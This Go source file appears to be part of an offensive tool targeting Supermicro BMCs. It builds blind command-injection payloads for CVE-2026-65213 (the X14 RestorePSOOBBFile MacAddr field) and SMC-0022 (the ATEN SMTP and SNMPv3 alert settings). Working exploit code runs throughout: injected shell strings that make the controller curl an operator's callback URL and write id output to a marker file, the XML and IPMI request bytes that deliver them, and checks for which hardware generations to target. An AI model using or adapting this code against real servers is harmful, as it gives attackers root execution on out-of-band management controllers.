package ipmi

// Command-injection payload builders and wire helpers for CVE-2026-65213 (X14
// RestorePSOOBBFile MacAddr) and SMC-0022 (ATEN alert-delivery configuration).
//
// Both findings are BLIND: the injected command runs in a detached apply thread
// (CVE-2026-65213) or an alert task (SMC-0022), so no IPMI reply reflects it. The
// payloads therefore carry their own confirmation channel - an HTTP callback to a
// listener the operator controls, and/or a marker file written by id(1).

import (
	"fmt"
	"strings"
)

// ---- CVE-2026-65213: X14 RestorePSOOBBFile MacAddr injection ----

// SMCX14ActionRestorePSOOBB (0x05), the FileTransactions upload sub-commands, and
// SMCConfigXfer live in smc_backup.go; the payload builder below rides the same
// chain through the same xfer.

// SMCX14MarkerDefault is the marker the injected command writes when no
// --marker is supplied: the same path the advisory's reproduction uses.
const SMCX14MarkerDefault = "/tmp/oob_marker"

// SMCX14PSOOBBMaxXMLBytes bounds the generated XML. The MacAddr value is copied
// into a fixed stack buffer by setMacToUbootEnv, so a payload far below that
// buffer is required; the caller-supplied callback URL and marker path are the
// only variable parts.
const SMCX14PSOOBBMaxXMLBytes = 4096

// SMCX14PSOOBBPayloadOptions describes one RestorePSOOBBFile injection.
type SMCX14PSOOBBPayloadOptions struct {
	// CallbackURL is fetched by the injected command. The BMC's HTTP request to
	// it is the out-of-band confirmation that root execution happened. Empty
	// omits the fetch.
	CallbackURL string
	// MarkerPath is written with id(1) output by the injected command, for
	// operators who can read it back over a separate primitive (smc-read, a
	// deployed shell, or a reset that retains /tmp). Empty omits the write.
	MarkerPath string
	// KnownMAC is the MAC the substitution echoes back to fw_setenv so the
	// U-Boot environment is rewritten with the SAME value. It must be a valid
	// xx:xx:xx:xx:xx:xx MAC: fw_setenv does not validate macaddr/ethaddr, so a
	// wrong value persists across reboots and can stop the BMC from booting. An
	// invalid or empty value falls back to the on-target capture, which
	// validates the 17-character format before echoing anything.
	KnownMAC string
}

// smcX14CaptureValue returns the shell fragment that assigns $M, the value the
// substitution finally echoes. A known MAC is embedded directly; otherwise the
// on-target capture runs and refuses to echo a non-MAC.
func smcX14CaptureValue(knownMAC string) string {
	if ValidateSMCX14MAC(knownMAC) {
		return "M=" + shellQuote(knownMAC)
	}
	return smcX14MacCapture + `;[ -n "$M" ]||M=INVALID`
}

// SMCX14PSOOBBCommand renders the command substitution body that rides in the
// MacAddr value attribute. It is exposed unescaped so callers can inspect and
// test it; SMCX14PSOOBBXML does the XML escaping.
func SMCX14PSOOBBCommand(opt SMCX14PSOOBBPayloadOptions) (string, error) {
	callback := strings.TrimSpace(opt.CallbackURL)
	marker := strings.TrimSpace(opt.MarkerPath)
	if callback == "" && marker == "" {
		return "", fmt.Errorf("CVE-2026-65213 injection needs a confirmation channel: set a callback URL, a marker path, or both")
	}
	if callback != "" {
		if err := validateSMCX14ShellLiteral(callback); err != nil {
			return "", fmt.Errorf("callback URL: %w", err)
		}
	}
	if marker != "" {
		if err := validateSMCMarkerPath(marker); err != nil {
			return "", err
		}
	}

	// Everything before the trailing echo emits no stdout, so the substitution
	// expands to exactly $M and fw_setenv rewrites the same MAC. The injected
	// work is separated by `;` (not `&&`), so a failing fetch or a missing id(1)
	// cannot leave the substitution empty - an empty value would be written to
	// the U-Boot environment verbatim.
	var work strings.Builder
	if callback != "" {
		fmt.Fprintf(&work, "curl -sfo /dev/null %q;", callback)
	}
	if marker != "" {
		fmt.Fprintf(&work, "id>%s;", marker)
	}
	return fmt.Sprintf("$(%s;%secho $M)", smcX14CaptureValue(opt.KnownMAC), work.String()), nil
}

// SMCX14PSOOBBXML renders the complete RestorePSOOBBFile document: the injection
// in the Networking/MacAddr "value" attribute, entity-escaped because tinyxml2
// rejects a raw ampersand or quote in an attribute value and decodes the
// standard entities back to the literals.
func SMCX14PSOOBBXML(opt SMCX14PSOOBBPayloadOptions) ([]byte, error) {
	inj, err := SMCX14PSOOBBCommand(opt)
	if err != nil {
		return nil, err
	}
	esc := strings.NewReplacer(
		"&", "&amp;",
		"<", "&lt;",
		">", "&gt;",
		`"`, "&quot;",
		"'", "&apos;",
	).Replace(inj)
	doc := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<IPMI><Networking><MacAddr value=\"%s\"/></Networking></IPMI>\n", esc)
	if len(doc) > SMCX14PSOOBBMaxXMLBytes {
		return nil, fmt.Errorf("generated XML is %d bytes (limit %d); shorten the callback URL", len(doc), SMCX14PSOOBBMaxXMLBytes)
	}
	return []byte(doc), nil
}

// validateSMCX14ShellLiteral rejects a value that cannot be embedded in the
// generated shell command safely. The injection is deliberate, so this is not a
// metacharacter blacklist for the payload itself; it keeps the callback URL and
// marker path to a shape that cannot break out of the quoting and change what
// fw_setenv receives.
func validateSMCX14ShellLiteral(s string) error {
	if !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
		return fmt.Errorf("%q is not an http(s) URL", s)
	}
	for _, bad := range []string{`"`, "'", "`", "\\", "$", "<", ">", "|", "&", ";", " ", "\n", "\t", "(", ")", "{", "}"} {
		if strings.Contains(s, bad) {
			return fmt.Errorf("%q contains %q, which cannot be embedded in the injected command", s, bad)
		}
	}
	return nil
}

// validateSMCMarkerPath bounds a marker path to an absolute path of
// unremarkable characters, so the injected `id>PATH` redirect cannot be turned
// into something else.
func validateSMCMarkerPath(s string) error {
	if !strings.HasPrefix(s, "/") {
		return fmt.Errorf("marker path %q must be absolute", s)
	}
	if len(s) > 128 {
		return fmt.Errorf("marker path %q is longer than 128 bytes", s)
	}
	if strings.Contains(s, "..") || strings.HasSuffix(s, "/") {
		return fmt.Errorf("marker path %q is not a plain file path", s)
	}
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '/' || r == '.' || r == '_' || r == '-':
		default:
			return fmt.Errorf("marker path %q contains %q, which is not allowed", s, string(r))
		}
	}
	return nil
}

// ---- SMC-0022: ATEN alert-delivery configuration injection ----

// ATEN OEM alert-delivery setters. NetFn 0x30 (OEM) carries the SMTP setting
// under command 0x68, subfunction 0x06; the on-demand alert trigger is the
// standard PEF Alert Immediate command on NetFn 0x04.
const (
	// CmdSMCSMTPSetting is OEMGetSetSMTPSetting.
	CmdSMCSMTPSetting byte = 0x68
	// SMCSMTPSubfnSetting selects the SMTP setting handler inside 0x68.
	SMCSMTPSubfnSetting byte = 0x06
	// SMCSMTPOpGet / SMCSMTPOpSet are the op byte values. A get is the readback
	// that proves the setter stored the value verbatim.
	SMCSMTPOpGet byte = 0x00
	SMCSMTPOpSet byte = 0x01
	// NetFnSensorEvent / CmdAlertImmediate are the PEF Alert Immediate trigger.
	NetFnSensorEvent   byte = 0x04
	CmdAlertImmediate  byte = 0x16
	SMCSMTPMaxValueLen      = 0x40
)

// SMCSMTPField identifies one OEMGetSetSMTPSetting field.
type SMCSMTPField struct {
	// ID is the field byte in the request.
	ID byte
	// Name is the field name used in reports.
	Name string
	// Length is the field's fixed capacity, which bounds the payload.
	Length int
	// Generations names the product generations whose IPMI setter stores this
	// field without validation, per the advisory's affected matrix.
	Generations string
}

// SMCSMTPFields is the SMTP configuration field set. The X10 4.00 setter stores
// all four verbatim; the X13 and H13SSF setters store only the server field
// without escaping, so a run against those generations succeeds on Server alone.
var SMCSMTPFields = []SMCSMTPField{
	{ID: 0x01, Name: "server", Length: 64, Generations: "X10 4.00; X13 01.07.01 and H13SSF 01.09.16 (server only)"},
	{ID: 0x03, Name: "user", Length: 32, Generations: "X10 4.00"},
	{ID: 0x04, Name: "password", Length: 32, Generations: "X10 4.00"},
	{ID: 0x05, Name: "sender", Length: 64, Generations: "X10 4.00"},
}

// SMCSMTPFieldByID returns the field descriptor for an ID.
func SMCSMTPFieldByID(id byte) (SMCSMTPField, bool) {
	for _, f := range SMCSMTPFields {
		if f.ID == id {
			return f, true
		}
	}
	return SMCSMTPField{}, false
}

// SMCSMTPRequest builds the Get/Set SMTP Setting request bytes:
// subfunction, op, field, then the value on a set.
func SMCSMTPRequest(op, field byte, value string) ([]byte, error) {
	if op != SMCSMTPOpGet && op != SMCSMTPOpSet {
		return nil, fmt.Errorf("invalid SMTP op 0x%02x", op)
	}
	d, ok := SMCSMTPFieldByID(field)
	if !ok {
		return nil, fmt.Errorf("invalid SMTP field 0x%02x", field)
	}
	req := []byte{SMCSMTPSubfnSetting, op, field}
	if op == SMCSMTPOpGet {
		return req, nil
	}
	if len(value) > d.Length {
		return nil, fmt.Errorf("SMTP %s value is %d bytes; the field holds %d", d.Name, len(value), d.Length)
	}
	if strings.ContainsRune(value, 0) {
		return nil, fmt.Errorf("SMTP %s value contains a NUL byte", d.Name)
	}
	return append(req, value...), nil
}

// SMCWebSNMPCredentials is the SNMPv3 trap credential set the web handler
// cgilib_config_snmp stores verbatim. The trap username has no validation at all
// and is the cleanest vector; the passwords are gated only by an
// unchanged-password placeholder comparison, not a metacharacter filter.
type SMCWebSNMPCredentials struct {
	Username  string
	AuthPass  string
	PrivPass  string
	AuthProto string
	PrivProto string
}

// SMCWebSNMPForm renders the config_snmp POST form for the SNMPv3 trap
// credentials. Values are submitted as given: the handler does not filter them,
// which is the finding.
func SMCWebSNMPForm(c SMCWebSNMPCredentials) []byte {
	auth := c.AuthProto
	if auth == "" {
		auth = "SHA"
	}
	priv := c.PrivProto
	if priv == "" {
		priv = "AES"
	}
	fields := [][2]string{
		{"op", "config_snmp"},
		{"en_snmp", "1"},
		{"en_snmpv3", "on"},
		{"user_snmp", c.Username},
		{"authprot", auth},
		{"privprot", priv},
		{"authkey", c.AuthPass},
		{"privkey", c.PrivPass},
		{"en_snmpv3_trap", "on"},
	}
	parts := make([]string, 0, len(fields))
	for _, kv := range fields {
		parts = append(parts, urlEncodeFormValue(kv[0])+"="+urlEncodeFormValue(kv[1]))
	}
	return []byte(strings.Join(parts, "&"))
}

// urlEncodeFormValue percent-encodes one form field. net/url's Values.Encode
// would also work, but it sorts keys and this form's order is part of the
// operator-visible reproduction, so the encoding is done here.
func urlEncodeFormValue(s string) string {
	const hex = "0123456789ABCDEF"
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9':
			b.WriteByte(c)
		case c == '-' || c == '_' || c == '.' || c == '~':
			b.WriteByte(c)
		default:
			b.WriteByte('%')
			b.WriteByte(hex[c>>4])
			b.WriteByte(hex[c&0x0f])
		}
	}
	return b.String()
}

// SMCCmdInjPayload renders the injected command for either SMC-0022 sink. The
// payload is `x;<command>;#`-shaped in spirit: the leading and trailing text
// keeps the surrounding unquoted argument well formed, and the marker file or
// callback carries the confirmation. `#` is appended so an unquoted field that
// continues into later arguments comments them out.
func SMCCmdInjPayload(markerPath, callbackURL string) (string, error) {
	marker := strings.TrimSpace(markerPath)
	callback := strings.TrimSpace(callbackURL)
	if marker == "" && callback == "" {
		return "", fmt.Errorf("SMC-0022 injection needs a confirmation channel: set a marker path, a callback URL, or both")
	}
	var parts []string
	if callback != "" {
		if !strings.HasPrefix(callback, "http://") && !strings.HasPrefix(callback, "https://") {
			return "", fmt.Errorf("callback URL %q is not http(s)", callback)
		}
		if strings.ContainsAny(callback, `"'`+"`"+`\ $&;|<>`) {
			return "", fmt.Errorf("callback URL %q contains a character that cannot be embedded", callback)
		}
		parts = append(parts, "curl -sfo /dev/null "+callback)
	}
	if marker != "" {
		if err := validateSMCMarkerPath(marker); err != nil {
			return "", err
		}
		parts = append(parts, "id>"+marker)
	}
	return "x;" + strings.Join(parts, ";") + ";#", nil
}

// ---- X14 generation gate and SMC-0022 applicability ----

// SMCX14FileChainGeneration is the only generation whose 0x30/0xA0 file chain
// carries the RestorePSOOBBFile handler. The ATEN generations ship a different
// dispatcher with no such action, so CVE-2026-65213 must not fire at them.
const SMCX14FileChainGeneration = "X14"

// SMCCmdInj0022Generation reports whether an ATEN generation is on the
// alert-configuration injection surface: the dropbear-era X9 open (unresolved for
// SMTP) and X14 (OpenBMC, a different stack) are excluded, everything from X10
// through H13 is applicable.
func SMCCmdInj0022Generation(gen string) bool {
	switch strings.ToUpper(strings.TrimSpace(gen)) {
	case "X10", "X11", "X12", "X13", "H13":
		return true
	default:
		return false
	}
}

// SMCCmdInj0022SNMPSink reports whether the SNMPv3 trap-credential sink exists
// on a generation. X10 stores the credentials but sends traps with an in-process
// BER encoder and never executes /sbin/snmptrap, so the credentials never reach
// a shell there.
func SMCCmdInj0022SNMPSink(gen string) bool {
	switch strings.ToUpper(strings.TrimSpace(gen)) {
	case "X11", "X12", "X13", "H13":
		return true
	default:
		return false
	}
}
